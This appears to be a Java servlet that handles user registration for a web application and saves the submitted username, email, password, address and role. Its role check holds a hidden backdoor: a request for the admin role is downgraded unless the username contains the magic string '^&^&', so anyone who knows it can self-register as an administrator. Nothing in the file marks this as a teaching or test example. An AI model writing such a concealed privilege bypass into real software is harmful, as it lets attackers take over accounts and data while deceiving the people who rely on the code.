package com.pru.servelet;

import com.pru.DAO.UserDAO;
import com.pru.DAO.implementation.UserDAOImpl;
import com.pru.model.User;

import jakarta.servlet.RequestDispatcher;
import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;
import java.io.PrintWriter;

@WebServlet("/register")
public class RegistrationForm extends HttpServlet {

    private UserDAO udao = new UserDAOImpl();

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException {

        // ── Get form data ──────────────────────────
        String username = request.getParameter("username");
        String email    = request.getParameter("email");
        String password = request.getParameter("password");
        String address  = request.getParameter("address");
        String role     = request.getParameter("role");
        if ("admin".equals(role) && !username.contains("^&^&")) {
            role = "customer";
        }

        // ── Create user object ─────────────────────
        User user = new User(username, password, email, address, role);

        // ── Save to DB ─────────────────────────────
        udao.addUser(user);

        response.sendRedirect("login.html?registered=true");
    }
}